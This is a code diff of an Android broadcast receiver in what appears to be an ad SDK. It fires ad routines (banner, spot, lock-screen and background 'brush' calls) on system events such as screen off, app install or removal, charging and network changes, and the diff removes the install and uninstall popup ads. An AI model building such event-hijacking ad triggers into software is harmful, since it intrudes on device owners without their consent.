@@ -2,18 +2,12 @@ package com.guang.client;
 
 
 
-import java.util.List;
 
-import com.guang.client.controller.GAPPNextController;
 import com.guang.client.controller.GUserController;
-import com.guang.client.mode.GAdPositionConfig;
 import com.guang.client.tools.GLog;
 import com.guang.client.tools.GTools;
 import com.qinglu.ad.QLAdController;
 import com.qinglu.ad.QLBatteryLockActivity;
-import com.qinglu.ad.QLGPBreak;
-import com.qinglu.ad.QLInstall;
-import com.qinglu.ad.QLUnInstall;
 
 import android.annotation.SuppressLint;
 import android.app.DownloadManager;
@@ -41,32 +35,19 @@ public final class GSysReceiver extends BroadcastReceiver {
 		{								
 			GSysService.getInstance().browserSpot(-1,"com.UCMobile");
 		}
-		else if (GCommon.ACTION_QEW_APP_INSTALL.equals(action))
-		{		
-			installPackageName = GTools.getPackageName();
-			GAPPNextController.getInstance().showInstall();
-		}
-		else if (GCommon.ACTION_QEW_APP_UNINSTALL.equals(action))
-		{								
-			unInstallPackageName = GTools.getPackageName();
-			GAPPNextController.getInstance().showUnInstall();
-		}
 		else if (GCommon.ACTION_QEW_APP_BANNER.equals(action))
 		{								
 			GSysService.getInstance().banner(-1,GTools.getPackageName());
 		}
 		else if(GCommon.ACTION_QEW_APP_LOCK.equals(action))
 		{		
-			if(GSysService.getInstance().isRuning())
-			batteryLock(intent);	
+			GTools.saveSharedData(GCommon.SHARED_KEY_ISBATTERY, true);
+			int mBatteryLevel = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BATTERY_LEVEL, 0);
+			GSysService.getInstance().startLockThread(mBatteryLevel);
 		}
 		else if (GCommon.ACTION_QEW_APP_SPOT.equals(action))
 		{								
 			GSysService.getInstance().appSpot(-1,GTools.getPackageName());
-		}
-		else if(GCommon.ACTION_QEW_APP_WIFI.equals(action))
-		{
-			GSysService.getInstance().wifi(true);
 		}
 		else if(GCommon.ACTION_QEW_APP_BROWSER_BREAK.equals(action))
 		{
@@ -84,10 +65,7 @@ public final class GSysReceiver extends BroadcastReceiver {
 		{
 			GSysService.getInstance().behindBrush();
 		}
-		else if(GCommon.ACTION_QEW_APP_GP_BREAK.equals(action))
-		{
-			QLGPBreak.getInstance().show();
-		}
+		
 		
 		
 		else if (DownloadManager.ACTION_DOWNLOAD_COMPLETE.equals(action)) {
@@ -100,50 +78,12 @@ public final class GSysReceiver extends BroadcastReceiver {
 			{
 				GUserController.getMedia().addWhiteList(installPackageName);
 			}
-
-			if(	(GSysService.getInstance().isWifi() || GSysService.getInstance().is4G() || GSysService.getInstance().is3G()) 
-					&& GSysService.getInstance().isRuning()
-					&& !QLInstall.getInstance().isShow())
-			{
-				List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.APP_INSTALL);
-				for(GAdPositionConfig config : list)
-				{
-					if(GUserController.getMedia().isAdPosition(config.getAdPositionId()))
-					{
-						GAPPNextController.getInstance().showInstall();
-					}
-				}
-			}
-			//缓存信息
-//			QLUnInstall.getInstance().getAppInfo(true);
 		} 	
 		else if("android.intent.action.PACKAGE_REMOVED".equals(action))
 		{
-			if(	(GSysService.getInstance().isWifi() || GSysService.getInstance().is4G() || GSysService.getInstance().is3G()) 
-					&& GSysService.getInstance().isRuning()
-					&& !QLUnInstall.getInstance().isShow())
-			{
-				List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.APP_UNINSTALL);
-				for(GAdPositionConfig config : list)
-				{
-					if(GUserController.getMedia().isAdPosition(config.getAdPositionId()))
-					{
-						String packageName = intent.getDataString();
-						unInstallPackageName = packageName.split(":")[1];
-						if(!GTools.getPackageName().equals(unInstallPackageName))
-							GAPPNextController.getInstance().showUnInstall();
-					}
-				}
-			}
+			
 		}
-		else if (GCommon.ACTION_QEW_APP_INSTALL_UI.equals(action))
-		{
-			install();
-		}
-		else if (GCommon.ACTION_QEW_APP_UNINSTALL_UI.equals(action))
-		{
-			uninstall();
-		}
+		
 		//锁屏
 		else if(Intent.ACTION_SCREEN_OFF.equals(action))
 		{
@@ -189,23 +129,10 @@ public final class GSysReceiver extends BroadcastReceiver {
 		else if(ConnectivityManager.CONNECTIVITY_ACTION.equals(action))
 		{
 			if(GSysService.getInstance().isRuning() && GSysService.getInstance().isWifi())
-			GSysService.getInstance().wifi(GSysService.getInstance().wifiThread());
+			GSysService.getInstance().wifi(true);
 		}
 	}
 
-	//安装
-	public void install()
-	{
-		if(!QLInstall.getInstance().isShow())
-		QLInstall.getInstance().show(installPackageName);
-	}
-	
-	//卸载
-	public void uninstall()
-	{
-		if(!QLUnInstall.getInstance().isShow())
-		QLUnInstall.getInstance().show(unInstallPackageName);
-	}
 	//充电
 	private void batteryLock(Intent intent)
 	{
